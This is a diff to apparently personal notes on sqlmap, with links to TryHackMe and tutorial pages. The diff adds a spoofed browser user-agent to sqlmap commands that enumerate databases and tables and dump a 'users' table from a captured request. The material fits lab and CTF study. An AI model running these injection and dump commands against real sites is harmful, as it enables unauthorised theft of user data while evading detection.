@@ -2,6 +2,8 @@ https://github.com/sqlmapproject/sqlmap
 
 https://tryhackme.com/room/sqlmap
 
+https://hackertarget.com/sqlmap-tutorial/
+
 
 ## GET
 
@@ -40,10 +42,11 @@ search=test*&submit
 List the databases, tables and columns:
 
 ````shell
-$ sqlmap -r request.txt --dbs
-$ sqlmap -r search.php-request.txt -D mydb --tables
-$ sqlmap -r search.php-request.txt -D mydb -T users --columns
-$ sqlmap -r search.php-request.txt -D mydb -T users --dump
+$ USERAGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
+$ sqlmap -r request.txt --dbs  -A "${USERAGENT}"
+$ sqlmap -r search.php-request.txt -D mydb --tables -A "${USERAGENT}"
+$ sqlmap -r search.php-request.txt -D mydb -T users --columns  -A "${USERAGENT}"
+$ sqlmap -r search.php-request.txt -D mydb -T users --dump -A "${USERAGENT}"
 ````
 
 Dump the database "mydb" to multiple CSVs:
